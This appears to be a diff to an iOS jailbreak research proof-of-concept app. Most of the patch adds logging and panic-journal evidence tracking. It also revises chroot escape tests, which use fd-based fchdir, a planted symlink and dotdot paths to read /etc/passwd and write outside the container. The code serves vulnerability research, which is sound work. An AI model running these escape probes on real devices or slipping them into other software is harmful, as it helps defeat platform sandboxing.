@@ -139,8 +139,9 @@ cat > "$WORK/main.m" << 'OBJC'
 /*
  * JBPoC — Unified iOS Jailbreak Research PoC
  *
- * Runs CVE-2026-43689 (chroot) and CVE-2026-84607 (AppleAVE2) PoCs
- * on the device. Results display on screen and in Console.app.
+ * Exercises behaviors in the same area as CVE-2026-43689 (chroot) and
+ * CVE-2026-84607 (AppleAVE2). CVE attribution is not established by
+ * this code alone. Results display on screen and in Console.app.
  *
  * LEGAL: Apple Security Bounty research on owned device.
  *        DMCA §1201(f)(j) exemptions apply.
@@ -179,6 +180,7 @@ extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uin
 #include <sys/utsname.h>
 #include <sys/sysctl.h>
 #include <os/log.h>
+#include <stdatomic.h>
 
 // ============================================================
 // Global log buffer — feeds both NSLog and the on-screen view
@@ -187,6 +189,7 @@ extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uin
 static NSMutableString *g_logBuffer = nil;
 static UITextView *g_logView = nil;
 static dispatch_queue_t g_logQueue = nil;
+static FILE *g_liveLog = NULL; /* r5: shared live console mirror */
 
 static NSString *wallClock(void) {
     NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
@@ -194,9 +197,14 @@ static NSString *wallClock(void) {
     return [fmt stringFromDate:[NSDate date]];
 }
 
+static void pocLogInit(void) {
+    g_logBuffer = [NSMutableString new];
+    g_logQueue = dispatch_queue_create("poc.log", DISPATCH_QUEUE_SERIAL);
+}
+
 static void pocLog(NSString *msg) {
-    if (!g_logBuffer) g_logBuffer = [NSMutableString new];
-    if (!g_logQueue) g_logQueue = dispatch_queue_create("poc.log", DISPATCH_QUEUE_SERIAL);
+    static dispatch_once_t logOnce;
+    dispatch_once(&logOnce, ^(void) { pocLogInit(); });
 
     NSString *stamped = [NSString stringWithFormat:@"[%@] %@", wallClock(), msg];
     NSLog(@"%@", stamped);
@@ -204,16 +212,68 @@ static void pocLog(NSString *msg) {
     dispatch_async(g_logQueue, ^{
         [g_logBuffer appendString:stamped];
         [g_logBuffer appendString:@"\n"];
-        NSString *snapshot = [g_logBuffer copy];
-        dispatch_async(dispatch_get_main_queue(), ^{
-            if (g_logView) {
-                g_logView.text = snapshot;
-                if (snapshot.length > 0) {
-                    NSRange end = NSMakeRange(snapshot.length - 1, 1);
-                    [g_logView scrollRangeToVisible:end];
+        // F8: mirror every line to a per-line-flushed file to improve
+        // panic survival. Lines already fsynced persist; queued-but-
+        // unprocessed lines can still be lost during a hard panic.
+        
+        if (!g_liveLog) {
+            NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+            [[NSFileManager defaultManager] createDirectoryAtPath:docs
+                withIntermediateDirectories:YES attributes:nil error:nil];
+            g_liveLog = fopen([docs stringByAppendingPathComponent:@"console_live.txt"].fileSystemRepresentation, "a");
+        }
+        if (g_liveLog) {
+            /* r5 F2: fflush to OS + fsync for durability; checked. */
+            if (fprintf(g_liveLog, "%s\n", stamped.UTF8String) < 0 ||
+                fflush(g_liveLog) != 0 || fsync(fileno(g_liveLog)) != 0) {
+                static BOOL r5liveFail = NO;
+                if (!r5liveFail) {
+                    NSLog(@"[-] live console log degraded - panic-tail capture at risk");
+                    r5liveFail = YES;
                 }
             }
-        });
+        }
+        // bounded in-memory buffer
+        if ([g_logBuffer length] > 400000) {
+            [g_logBuffer deleteCharactersInRange:NSMakeRange(0, [g_logBuffer length] - 300000)];
+        }
+        // F9: UI refresh at most 4x/sec — but ALWAYS flush the tail: a
+        // message inside the quiet window schedules a delayed refresh.
+        static CFAbsoluteTime lastUI = 0.0;
+        static BOOL uiPending = NO;
+        CFAbsoluteTime now = CFAbsoluteTimeGetCurrent();
+        if (now - lastUI >= 0.25) {
+            lastUI = now;
+            uiPending = NO;
+            NSString *snapshot = [g_logBuffer copy];
+            dispatch_async(dispatch_get_main_queue(), ^{
+                if (g_logView) {
+                    g_logView.text = snapshot;
+                    if (snapshot.length > 0) {
+                        NSRange end = NSMakeRange(snapshot.length - 1, 1);
+                        [g_logView scrollRangeToVisible:end];
+                    }
+                }
+            });
+        } else if (!uiPending) {
+            uiPending = YES;
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.35 * NSEC_PER_SEC)),
+                           g_logQueue, ^{
+                if (!uiPending) return;
+                uiPending = NO;
+                lastUI = CFAbsoluteTimeGetCurrent();
+                NSString *snapshot = [g_logBuffer copy];
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    if (g_logView) {
+                        g_logView.text = snapshot;
+                        if (snapshot.length > 0) {
+                            NSRange end = NSMakeRange(snapshot.length - 1, 1);
+                            [g_logView scrollRangeToVisible:end];
+                        }
+                    }
+                });
+            });
+        }
     });
 }
 
@@ -221,6 +281,247 @@ static void pocLog(NSString *msg) {
 #define PASS(fmt, ...) pocLog([NSString stringWithFormat:@"[+] " fmt, ##__VA_ARGS__])
 #define FAIL(fmt, ...) pocLog([NSString stringWithFormat:@"[-] " fmt, ##__VA_ARGS__])
 #define INFO(fmt, ...) pocLog([NSString stringWithFormat:@"[*] " fmt, ##__VA_ARGS__])
+
+// ============================================================
+// Panic journal + runlog (evidence hygiene)
+// Panicked runs never come back to log their own result.
+// Arm a journal at run start; next launch compares kern.boottime.
+// ============================================================
+#include <sys/time.h>
+
+static NSString *jbBootID(void) {
+    int mib[2] = {CTL_KERN, KERN_BOOTTIME};
+    struct timeval bt; size_t len = sizeof(bt);
+    if (sysctl(mib, 2, &bt, &len, NULL, 0) != 0) return @"unknown";
+    return [NSString stringWithFormat:@"%ld.%06ld", (long)bt.tv_sec, (long)bt.tv_usec];
+}
+
+static NSString *jbOSBuild(void) {
+    char buf[64] = {0}; size_t len = sizeof(buf) - 1;
+    sysctlbyname("kern.osversion", buf, &len, NULL, 0);
+    return [NSString stringWithFormat:@"%s", buf];
+}
+
+static void jbRunLog(NSString *line) {
+    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+    [[NSFileManager defaultManager] createDirectoryAtPath:docs
+        withIntermediateDirectories:YES attributes:nil error:nil];
+    FILE *f = fopen([docs stringByAppendingPathComponent:@"runlog.txt"].fileSystemRepresentation, "a");
+    if (!f) { NSLog(@"jbRunLog: fopen failed"); return; }
+    fprintf(f, "%s\n", line.UTF8String);
+    fflush(f);
+    fsync(fileno(f)); // survive panic/reboot: runlog rows are evidence
+    fclose(f);
+}
+
+static void jbSyncFile(NSString *path) {
+    int fd = open(path.fileSystemRepresentation, O_RDONLY);
+    if (fd >= 0) { fsync(fd); close(fd); }
+}
+
+static NSString *jbJournalPath(void) {
+    return [[NSHomeDirectory() stringByAppendingPathComponent:@"Documents"]
+        stringByAppendingPathComponent:@"panic_journal.txt"];
+}
+
+static void armPanicJournal(NSString *label) {
+    // Resolve a previous unfinished journal NOW so overlapping runs
+    // can't clobber each other's evidence.
+    NSDictionary *stale = [NSDictionary dictionaryWithContentsOfFile:jbJournalPath()];
+    // Finished journal from a prior run: if the boot changed since it ENDED,
+    // the reboot may still belong to that run's deferred fault (F8).
+    NSString *priorRun = nil;
+    NSDate *priorGrace = nil;
+    if (stale && [stale[@"finished"] boolValue]) {
+        NSString *endedBoot = stale[@"boot_at_end"] ?: stale[@"boot_id"];
+        if (![endedBoot isEqualToString:jbBootID()]) {
+            PASS(@"*** DELAYED REBOOT DETECTED after run '%@' completed — cause unconfirmed ***",
+                 stale[@"label"]);
+            jbRunLog([NSString stringWithFormat:
+                @"DELAYED-REBOOT-UNCONFIRMED | %@ | ended_boot=%@ | now=%@ | build=%@",
+                stale[@"label"], endedBoot, jbBootID(), jbOSBuild()]);
+        } else {
+            NSDate *grace = stale[@"grace_until"] ?: [NSDate distantPast];
+            if ([[NSDate date] compare:grace] == NSOrderedAscending) {
+                // F7: don't clobber attribution — the prior run's deferred-fault
+                // window is still open. Carry it inside the new journal.
+                priorRun = stale[@"label"];
+                priorGrace = grace;
+                INFO(@"Prior run '%@' grace window open until %@ — attribution carried.", priorRun, grace);
+            }
+        }
+        [[NSFileManager defaultManager] removeItemAtPath:jbJournalPath() error:nil];
+    }
+    if (stale && ![stale[@"finished"] boolValue]) {
+        if (![stale[@"boot_id"] isEqualToString:jbBootID()]) {
+            PASS(@"*** REBOOT DETECTED for run '%@' — cause unconfirmed (check .ips) ***",
+                 stale[@"label"]);
+            jbRunLog([NSString stringWithFormat:
+                @"REBOOT-UNCONFIRMED | %@ | armed_boot=%@ | now=%@ | build=%@",
+                stale[@"label"], stale[@"boot_id"], jbBootID(), stale[@"os_build"]]);
+        } else {
+            INFO(@"Prior run '%@' left an unfinished journal without a reboot — interrupted.",
+                 stale[@"label"]);
+            jbRunLog([NSString stringWithFormat:@"INTERRUPTED | %@ | boot=%@ | build=%@",
+                      stale[@"label"], jbBootID(), stale[@"os_build"]]);
+        }
+    }
+    NSMutableDictionary *j = [@{
+        @"label": label,
+        @"boot_id": jbBootID(),
+        @"os_build": jbOSBuild(),
+        @"started_at": [NSDate date],
+        @"finished": @NO
+    } mutableCopy];
+    if (priorRun) {
+        j[@"prior_run"] = priorRun;
+        j[@"prior_grace_until"] = priorGrace;
+    }
+    if (![j writeToFile:jbJournalPath() atomically:YES])
+        NSLog(@"armPanicJournal: journal write failed (path: %@)", jbJournalPath());
+    jbSyncFile(jbJournalPath());
+}
+
+static void endPanicJournal(NSString *label) {
+    NSDictionary *j = [NSDictionary dictionaryWithContentsOfFile:jbJournalPath()];
+    if (j && [j[@"label"] isEqual:label]) {
+        NSMutableDictionary *m = [j mutableCopy];
+        m[@"finished"] = @YES;
+        m[@"ended_at"] = [NSDate date];
+        // Boot at completion + grace window: a reboot AFTER the run visibly
+        // finished may still belong to that run's deferred fault (F8).
+        m[@"boot_at_end"] = jbBootID();
+        m[@"grace_until"] = [NSDate dateWithTimeIntervalSinceNow:240.0];
+        if (![m writeToFile:jbJournalPath() atomically:YES])
+            NSLog(@"endPanicJournal: journal write failed (path: %@)", jbJournalPath());
+        jbSyncFile(jbJournalPath());
+        jbRunLog([NSString stringWithFormat:@"RUN-END | %@ | boot=%@ | build=%@ | deferred-grace=240s",
+                  label, jbBootID(), jbOSBuild()]);
+    }
+}
+
+static void resolvePanicJournal(void) {
+    NSDictionary *j = [NSDictionary dictionaryWithContentsOfFile:jbJournalPath()];
+    if (!j) return;
+    if ([j[@"finished"] boolValue]) {
+        NSString *endedBoot = j[@"boot_at_end"] ?: j[@"boot_id"];
+        if (![endedBoot isEqualToString:jbBootID()]) {
+            PASS(@"*** DELAYED REBOOT DETECTED after run '%@' completed — cause unconfirmed ***",
+                 j[@"label"]);
+            PASS(@"    Possibly a deferred fault from that run; pair with a panic .ips if present.");
+            jbRunLog([NSString stringWithFormat:
+                @"DELAYED-REBOOT-UNCONFIRMED | %@ | ended_boot=%@ | now=%@ | build=%@",
+                j[@"label"], endedBoot, jbBootID(), jbOSBuild()]);
+            [[NSFileManager defaultManager] removeItemAtPath:jbJournalPath() error:nil];
+            return;
+        }
+        NSDate *grace = j[@"grace_until"] ?: [NSDate distantPast];
+        if ([[NSDate date] compare:grace] == NSOrderedDescending) {
+            [[NSFileManager defaultManager] removeItemAtPath:jbJournalPath() error:nil];
+        } else {
+            INFO(@"Run '%@' finished; journal kept (deferred-fault grace until %@).",
+                 j[@"label"], grace);
+        }
+        return;
+    }
+    NSString *armedBoot = j[@"boot_id"] ?: @"?";
+    if (![armedBoot isEqualToString:jbBootID()]) {
+        PASS(@"*** REBOOT DETECTED for run '%@' — cause unconfirmed ***", j[@"label"]);
+        PASS(@"    A reboot after an unfinished run proves only that the run didn't");
+        PASS(@"    complete. Kernel panic is confirmed ONLY by a matching panic .ips.");
+        if (j[@"prior_run"]) {
+            PASS(@"    NOTE: completed run '%@' still had an OPEN deferred-fault grace", j[@"prior_run"]);
+            PASS(@"    window when this run started — either run could explain the reboot.");
+        }
+        PASS(@"    armed boot=%@  now=%@  build=%@",
+             armedBoot, jbBootID(), j[@"os_build"]);
+        PASS(@"    Pair the matching .ips (Settings > Privacy > Analytics Data)");
+        PASS(@"    by timestamp with journal 'started_at'. Both are evidence.");
+        jbRunLog([NSString stringWithFormat:@"REBOOT-UNCONFIRMED | %@ | armed_boot=%@ | now=%@ | build=%@",
+                  j[@"label"], armedBoot, jbBootID(), j[@"os_build"]]);
+    } else {
+        INFO(@"Journal unfinished but same boot: run '%@' interrupted without panic.", j[@"label"]);
+        jbRunLog([NSString stringWithFormat:@"INTERRUPTED | %@ | boot=%@ | build=%@",
+                  j[@"label"], jbBootID(), jbOSBuild()]);
+    }
+    [[NSFileManager defaultManager] removeItemAtPath:jbJournalPath() error:nil];
+}
+
+// ============================================================
+// jbDispatch: single-flight wrapper for all PoC buttons
+//  1. one test runs at a time (globals stay consistent)
+//  2. resolves any stale journal BEFORE arming (no clobber)
+//  3. persists the full console log to Documents/console_*.txt
+//     at run completion (panicking runs still lose the tail)
+// ============================================================
+static BOOL g_jbRunInFlight = NO;
+static BOOL g_processSuspect = NO; // chroot restore failed: later runs blocked
+static dispatch_queue_t g_jbSerial = NULL;
+
+static void jbPersistLog(void) {
+    if (!g_logQueue || !g_logBuffer) return;
+    dispatch_sync(g_logQueue, ^{
+        NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+        [[NSFileManager defaultManager] createDirectoryAtPath:docs
+            withIntermediateDirectories:YES attributes:nil error:nil];
+        NSDateFormatter *f = [[NSDateFormatter alloc] init];
+        f.dateFormat = @"yyyyMMdd_HHmmss";
+        NSString *fn = [NSString stringWithFormat:@"%@/console_%@.txt",
+                        docs, [f stringFromDate:[NSDate date]]];
+        NSFileManager *fm = [NSFileManager defaultManager];
+        NSString *live = [docs stringByAppendingPathComponent:@"console_live.txt"];
+        BOOL ok = NO;
+        if ([fm fileExistsAtPath:live]) {
+            jbSyncFile(live); // flush the live mirror before copying
+            NSError *cerr = nil;
+            ok = [fm copyItemAtPath:live toPath:fn error:&cerr];
+            if (!ok) NSLog(@"jbPersistLog: live-history copy failed: %@", cerr.localizedDescription);
+        }
+        if (!ok) {
+            if ([g_logBuffer length] == 0) return;
+            NSError *werr = nil;
+            if (![g_logBuffer writeToFile:fn atomically:YES
+                                  encoding:NSUTF8StringEncoding error:&werr])
+                NSLog(@"jbPersistLog: fallback write failed: %@", werr.localizedDescription);
+        }
+        // fresh live mirror for the next run (checked)
+        if (g_liveLog) {
+            fflush(g_liveLog); fsync(fileno(g_liveLog));
+            fclose(g_liveLog); g_liveLog = NULL; /* r5 F1: rotate before truncate */
+        }
+        FILE *r5tf = fopen(live.fileSystemRepresentation, "w");
+        if (r5tf) fclose(r5tf);
+        else NSLog(@"jbPersistLog: live truncate failed");
+    });
+}
+
+static void jbDispatch(NSString *label, void (^block)(void)) {
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        g_jbSerial = dispatch_queue_create("jb.dispatch", DISPATCH_QUEUE_SERIAL);
+    });
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        __block BOOL start = NO;
+        dispatch_sync(g_jbSerial, ^{
+            if (!g_jbRunInFlight) { g_jbRunInFlight = YES; start = YES; }
+        });
+        if (!start) {
+            INFO(@"Another test is running — '%@' ignored (runs must not overlap).", label);
+            return;
+        }
+        if (g_processSuspect) {
+            FAIL(@"Process state UNRELIABLE — an earlier chroot restore failed.");
+            FAIL(@"Restart the app before more runs; results would be suspect.");
+            dispatch_sync(g_jbSerial, ^{ g_jbRunInFlight = NO; });
+            return;
+        }
+        armPanicJournal(label);
+        block();
+        endPanicJournal(label);
+        jbPersistLog();
+        dispatch_sync(g_jbSerial, ^{ g_jbRunInFlight = NO; });
+    });
+}
 
 // ============================================================
 // Device info collection
@@ -258,6 +559,16 @@ static void printDeviceInfo(void) {
 // ============================================================
 // CVE-2026-43689 — chroot(2) Entitlement Bypass
 // ============================================================
+
+// Opened BEFORE chroot: post-chroot containment oracle via faccessat().
+static int g_fakeRootDirFd = -1;
+// F3/F12: process-restore handles + fd-escape proof + chroot baseline.
+// runChrootPoC un-chroots and restores cwd when done, so later runs (and
+// journal/log writes) don't execute in an altered process.
+static int g_restoreRootFd = -1;
+static int g_restoreCwdFd = -1;
+static BOOL g_fdEscapeProven = NO;
+static struct { BOOL can_read_passwd; BOOL can_write_tmp; BOOL measured; } g_chrootBaseline = {NO, NO, NO};
 
 typedef struct {
     BOOL chroot_succeeded;
@@ -297,6 +608,12 @@ static Q1Result testQ1_ChrootCallable(NSString *fakeRootPath) {
 
     NSString *marker = [fakeRootPath stringByAppendingPathComponent:@"etc/.chroot_marker"];
     [@"Q1-CONFIRMED" writeToFile:marker atomically:YES encoding:NSUTF8StringEncoding error:nil];
+
+    // Discriminator: jailed /etc/passwd reads "FAKE-PASSWD"; the real system
+    // /etc/passwd contains "root:". CONTENT decides escape claims, not stat().
+    NSString *fakeEtc = [fakeRootPath stringByAppendingPathComponent:@"etc/passwd"];
+    if (![@"FAKE-PASSWD\n" writeToFile:fakeEtc atomically:YES encoding:NSUTF8StringEncoding error:nil])
+        FAIL(@"Discriminator write FAILED — content-verified escapes will under-report this run.");
 
     INFO(@"Pre-chroot baseline:");
     struct stat st;
@@ -377,49 +694,104 @@ static Q2Result testQ2_SandboxPathConfusion(NSString *fakeRootPath) {
         }
     }
 
-    // 2c: Symlink escape (pre-planted before chroot)
+    // 2c: Symlink path — claims verified by CONTENT (real passwd contains
+    // "root:") and CONTAINMENT (relative write absent from fakeroot).
     {
-        struct stat st;
-        if (stat("/escape/etc/passwd", &st) == 0) {
-            PASS(@"2c: SYMLINK ESCAPE — /escape/etc/passwd ACCESSIBLE");
+        BOOL sawReal = NO;
+        int fd = open("/escape/etc/passwd", O_RDONLY);
+        if (fd >= 0) {
+            char buf[128] = {0};
+            ssize_t n = read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            INFO(@"2c: /escape/etc/passwd content (%zd bytes): %.24s", n, buf);
+            if (n > 0 && strstr(buf, "root:") != NULL) sawReal = YES;
+        } else {
+            INFO(@"2c: /escape/etc/passwd unreadable: %s", strerror(errno));
+        }
+        if (sawReal) {
+            PASS(@"2c: REAL /etc/passwd visible via /escape path.");
             result.symlink_escape_works = YES;
+            if (!g_chrootBaseline.can_read_passwd)
+                result.can_read_forbidden = YES;
+            else
+                INFO(@"2c: baseline could already read passwd — not a 'forbidden read'.");
+        } else {
+            INFO(@"2c: /escape resolves inside fakeroot — no escape proof.");
+        }
 
-            int fd = open("/escape/tmp/chroot_escape_proof", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-            if (fd >= 0) {
-                const char *proof = "CVE-2026-43689 sandbox escape confirmed\n";
-                write(fd, proof, strlen(proof));
-                close(fd);
-                PASS(@"2c: WROTE TO REAL /tmp VIA SYMLINK ESCAPE");
-                result.sandbox_confused = YES;
-                result.can_write_outside_container = YES;
-            } else {
-                INFO(@"2c: Symlink readable, not writable: %s", strerror(errno));
-            }
-
-            fd = open("/escape/etc/passwd", O_RDONLY);
-            if (fd >= 0) {
-                char buf[128];
-                ssize_t n = read(fd, buf, sizeof(buf) - 1);
-                close(fd);
-                if (n > 0) {
-                    buf[n < 60 ? n : 60] = '\0';
-                    PASS(@"2c: Read /etc/passwd: %.50s...", buf);
-                    result.can_read_forbidden = YES;
+        const char *relTarget = "tmp/.jb2c_write";
+        unlink(relTarget);
+        int wfd = open(relTarget, O_CREAT | O_WRONLY | O_TRUNC, 0644); // relative
+        if (wfd >= 0) {
+            const char *proof = "jb2c";
+            write(wfd, proof, strlen(proof));
+            close(wfd);
+            BOOL landedInside = NO;
+            BOOL verified = NO;
+            if (g_fakeRootDirFd >= 0) {
+                errno = 0;
+                if (faccessat(g_fakeRootDirFd, "tmp/.jb2c_write", F_OK, 0) == 0) {
+                    landedInside = YES; verified = YES;
+                } else if (errno == ENOENT) {
+                    landedInside = NO; verified = YES;
+                } else {
+                    // F1: EACCES etc. means "unprobeable", NOT "absent".
+                    INFO(@"2c: faccessat inconclusive: %s", strerror(errno));
                 }
             }
+            if (verified && !landedInside) {
+                // F1: positively locate WHERE the write landed before any
+                // outside-container claim. Absence from fakeroot alone
+                // proves only "not in fakeroot".
+                int efd = open("/escape/tmp/.jb2c_write", O_RDONLY);
+                BOOL atRealTmp = NO;
+                if (efd >= 0) {
+                    char b[16] = {0};
+                    ssize_t rn = read(efd, b, 4);
+                    close(efd);
+                    atRealTmp = (rn == 4 && strncmp(b, "jb2c", 4) == 0);
+                }
+                if (atRealTmp) {
+                    PASS(@"2c: write POSITIVELY located in real /tmp via /escape symlink + content.");
+                    result.sandbox_confused = YES;
+                    if (g_chrootBaseline.can_write_tmp)
+                        INFO(@"2c: baseline could already write /tmp — not escape evidence.");
+                    else
+                        result.can_write_outside_container = YES;
+                } else {
+                    INFO(@"2c: write landed outside fakeroot; exact location UNVERIFIED —");
+                    INFO(@"2c: no outside-container claim made this run.");
+                }
+            } else {
+                INFO(@"2c: relative write landed inside fakeroot — no outside-container proof.");
+            }
+            unlink(relTarget);
         } else {
-            INFO(@"2c: /escape/etc/passwd not reachable (%s)", strerror(errno));
+            INFO(@"2c: relative write blocked: %s", strerror(errno));
         }
     }
 
-    // 2d: Relative path escape
+    // 2d: Relative dotdot path — verified by CONTENT (real passwd has
+    // "root:", the jailed copy reads "FAKE-PASSWD"); stat() proves nothing.
     {
-        struct stat st;
-        if (stat("/../../../etc/passwd", &st) == 0) {
-            PASS(@"2d: RELATIVE PATH ESCAPE WORKS");
-            result.sandbox_confused = YES;
+        int fd = open("/../../../etc/passwd", O_RDONLY);
+        if (fd >= 0) {
+            char buf[128] = {0};
+            ssize_t n = read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            INFO(@"2d: /../../../etc/passwd content (%zd bytes): %.24s", n, buf);
+            if (n > 0 && strstr(buf, "root:") != NULL) {
+                PASS(@"2d: RELATIVE PATH ESCAPE PROVEN (real passwd content).");
+                if (g_chrootBaseline.can_read_passwd)
+                    INFO(@"2d: baseline could already read passwd — not 'forbidden' this run.");
+                result.sandbox_confused = YES;
+            } else if (n > 0 && strstr(buf, "FAKE-PASSWD") != NULL) {
+                INFO(@"2d: Path resolves INSIDE the jail — no escape.");
+            } else {
+                INFO(@"2d: Content unknown — no conclusion.");
+            }
         } else {
-            INFO(@"2d: Relative escape blocked: %s", strerror(errno));
+            INFO(@"2d: /../../../etc/passwd unreadable: %s", strerror(errno));
         }
     }
 
@@ -469,6 +841,10 @@ static void testQ3_PrivilegedAccess(Q2Result q2) {
 }
 
 static void plantSymlinkEscape(NSString *fakeRootPath) {
+    // F11: ensure fakeroot exists BEFORE planting /escape inside it
+    // (fresh installs may not have Documents/fakeroot yet).
+    [[NSFileManager defaultManager] createDirectoryAtPath:fakeRootPath
+        withIntermediateDirectories:YES attributes:nil error:nil];
     NSString *escapePath = [fakeRootPath stringByAppendingPathComponent:@"escape"];
     unlink([escapePath UTF8String]);
     rmdir([escapePath UTF8String]);
@@ -481,6 +857,52 @@ static void plantSymlinkEscape(NSString *fakeRootPath) {
     }
 }
 
+// F2: what could the app's sandbox reach BEFORE any chroot? Escape claims
+// are only meaningful against this measured baseline, not assumed.
+static void measureChrootBaseline(void) {
+    g_chrootBaseline.measured = YES;
+    int fd = open("/etc/passwd", O_RDONLY);
+    if (fd >= 0) { char b[16] = {0}; read(fd, b, 15); close(fd); g_chrootBaseline.can_read_passwd = YES; }
+    int w = open("/tmp/.jb_baseline_probe", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    if (w >= 0) { close(w); unlink("/tmp/.jb_baseline_probe"); g_chrootBaseline.can_write_tmp = YES; }
+    INFO(@"Baseline (pre-chroot, app sandbox): read /etc/passwd=%@  write /tmp=%@",
+         g_chrootBaseline.can_read_passwd ? @"YES" : @"NO",
+         g_chrootBaseline.can_write_tmp ? @"YES" : @"NO");
+    if (g_chrootBaseline.can_read_passwd)
+        INFO(@"Baseline can ALREADY read /etc/passwd — 'forbidden read' claims void this run.");
+    if (g_chrootBaseline.can_write_tmp)
+        INFO(@"Baseline can ALREADY write /tmp — 'outside write' claims void this run.");
+}
+
+// F3/F12: undo chroot/cwd changes; closes the fakeroot containment fd.
+static void jbRestoreProcessRoot(BOOL chrooted) {
+    if (g_fakeRootDirFd >= 0) { close(g_fakeRootDirFd); g_fakeRootDirFd = -1; }
+    if (g_restoreRootFd >= 0) {
+        if (fchdir(g_restoreRootFd) == 0) {
+            if (chrooted) {
+                if (chroot(".") != 0) {
+                    INFO(@"restore: chroot('.') failed: %s — process may remain jailed", strerror(errno));
+                    g_processSuspect = YES;
+                }
+                else
+                    INFO(@"restore: process root is the real / again.");
+            }
+            if (g_restoreCwdFd >= 0 && fchdir(g_restoreCwdFd) != 0) {
+                INFO(@"restore: fchdir(saved cwd) failed: %s", strerror(errno));
+                g_processSuspect = YES;
+            }
+        } else {
+            INFO(@"restore: fchdir(saved root) failed: %s", strerror(errno));
+            g_processSuspect = YES;
+        }
+        close(g_restoreRootFd); g_restoreRootFd = -1;
+    } else if (chrooted) {
+        INFO(@"restore: no saved root fd — cannot un-chroot");
+        g_processSuspect = YES;
+    }
+    if (g_restoreCwdFd >= 0) { close(g_restoreCwdFd); g_restoreCwdFd = -1; }
+}
+
 static void runChrootPoC(void) {
     pocLog(@"");
     pocLog(@"╔══════════════════════════════════════╗");
@@ -491,10 +913,27 @@ static void runChrootPoC(void) {
     NSString *container = NSHomeDirectory();
     NSString *fakeRoot = [container stringByAppendingPathComponent:@"Documents/fakeroot"];
 
+    // F2: per-run resets — stale YES from an earlier run must not leak in.
+    g_fdEscapeProven = NO;
+    g_chrootBaseline.can_read_passwd = NO;
+    g_chrootBaseline.can_write_tmp = NO;
+    g_chrootBaseline.measured = NO;
+    measureChrootBaseline(); // BEFORE any chdir/chroot
     plantSymlinkEscape(fakeRoot);
 
     int saved_root_fd = open("/", O_RDONLY);
     INFO(@"Saved root fd: %d", saved_root_fd);
+    // F12: ensure fakeroot exists BEFORE opening its fd (fresh installs);
+    // save cwd/root handles so the process can be restored afterward.
+    [[NSFileManager defaultManager] createDirectoryAtPath:fakeRoot
+        withIntermediateDirectories:YES attributes:nil error:nil];
+    g_fakeRootDirFd = open([fakeRoot UTF8String], O_RDONLY);
+    if (g_fakeRootDirFd < 0)
+        FAIL(@"fakeroot dir fd: %s — containment oracle unavailable", strerror(errno));
+    else
+        INFO(@"Saved fakeroot dir fd: %d (containment oracle)", g_fakeRootDirFd);
+    g_restoreRootFd = open("/", O_RDONLY);
+    g_restoreCwdFd = open(".", O_RDONLY);
 
     Q1Result q1 = testQ1_ChrootCallable(fakeRoot);
 
@@ -502,21 +941,42 @@ static void runChrootPoC(void) {
         pocLog(@"");
         LOG(@"RESULT: chroot failed (errno=%d). Bug scope may be narrower.", q1.chroot_errno);
         if (saved_root_fd >= 0) close(saved_root_fd);
+        jbRestoreProcessRoot(NO); // cwd was still chdir'd — restore it
         return;
     }
 
-    // Try fd-based chroot escape
+    // fd-based chroot escape — claim requires cwd == "/" (exact) AND real
+    // /etc/passwd content via a RELATIVE path (the jailed copy reads
+    // "FAKE-PASSWD"). A short cwd alone proves nothing.
     INFO(@"Attempting fd-based chroot escape...");
     if (saved_root_fd >= 0) {
         if (fchdir(saved_root_fd) == 0) {
             PASS(@"fchdir to saved root fd succeeded!");
             for (int i = 0; i < 20; i++) chdir("..");
             char cwd[PATH_MAX];
+            BOOL atRoot = NO;
             if (getcwd(cwd, sizeof(cwd))) {
                 INFO(@"CWD after escape: %s", cwd);
-                if (strcmp(cwd, "/") == 0 || strlen(cwd) < 5) {
-                    PASS(@"ESCAPED CHROOT VIA FD + CHDIR!");
-                }
+                atRoot = (strcmp(cwd, "/") == 0);
+            }
+            BOOL sawRealPasswd = NO;
+            int pfd = open("etc/passwd", O_RDONLY); // relative: resolves from cwd
+            if (pfd >= 0) {
+                char pbuf[128] = {0};
+                ssize_t n = read(pfd, pbuf, sizeof(pbuf) - 1);
+                close(pfd);
+                INFO(@"Relative etc/passwd (%zd bytes): %.24s", n, pbuf);
+                if (n > 0 && strstr(pbuf, "root:") != NULL) sawRealPasswd = YES;
+            } else {
+                INFO(@"Relative etc/passwd unreadable: %s", strerror(errno));
+            }
+            if (atRoot && sawRealPasswd) {
+                PASS(@"CHROOT ESCAPE PROVEN (cwd=/ + real passwd via relative path).");
+                g_fdEscapeProven = YES;
+                PASS(@"Note: chroot escape only — sandbox escape still unproven.");
+            } else {
+                INFO(@"Chroot escape unproven (atRoot=%d realPasswd=%d).",
+                     atRoot, sawRealPasswd);
             }
         } else {
             INFO(@"fchdir escape failed: %s", strerror(errno));
@@ -538,11 +998,14 @@ static void runChrootPoC(void) {
     pocLog([NSString stringWithFormat:@"     symlink escape:   %@",
             q2.symlink_escape_works ? @"YES" : @"NO"]);
     pocLog([NSString stringWithFormat:@"     fd escape:        %@",
-            q2.fd_escape_works ? @"YES" : @"NO"]);
+            g_fdEscapeProven ? @"YES" : @"NO"]);
     pocLog([NSString stringWithFormat:@"     write outside:    %@",
             q2.can_write_outside_container ? @"YES ★" : @"NO"]);
     pocLog([NSString stringWithFormat:@"     read forbidden:   %@",
             q2.can_read_forbidden ? @"YES" : @"NO"]);
+    // F3/F12: restore root/cwd + close containment fd so later runs and
+    // journal/log writes execute in an unaltered process.
+    jbRestoreProcessRoot(YES);
     pocLog(@"");
 }
 
@@ -572,6 +1035,7 @@ static void testAVE2_VideoToolbox(void) {
         (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
     };
 
+    CMVideoCodecType chosenCodec = kCMVideoCodecType_HEVC;
     OSStatus status = VTCompressionSessionCreate(
